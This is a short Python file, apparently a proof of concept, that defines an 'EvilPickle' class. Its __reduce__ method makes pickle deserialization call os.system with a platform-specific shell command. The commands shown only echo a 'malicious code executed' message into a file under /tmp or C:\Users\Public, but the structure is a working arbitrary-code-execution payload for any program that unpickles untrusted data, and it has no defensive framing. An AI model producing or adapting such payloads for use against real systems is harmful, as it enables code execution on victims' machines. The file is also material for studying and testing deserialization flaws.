import pickle
import os

class EvilPickle:
    def __init__(self, payload_type="linux"):
        self.payload_type = payload_type
    
    def __reduce__(self):
        if self.payload_type == "linux":
            cmd = "echo 'Malicious code executed on Linux!' > /tmp/evil.txt"
        elif self.payload_type == "windows":
            cmd = "echo Malicious code executed on Windows! > C:\\Users\\Public\\evil.txt"
        else:
            cmd = "echo 'Unknown OS payload executed!' > /tmp/evil.txt"
        
        return (os.system, (cmd,))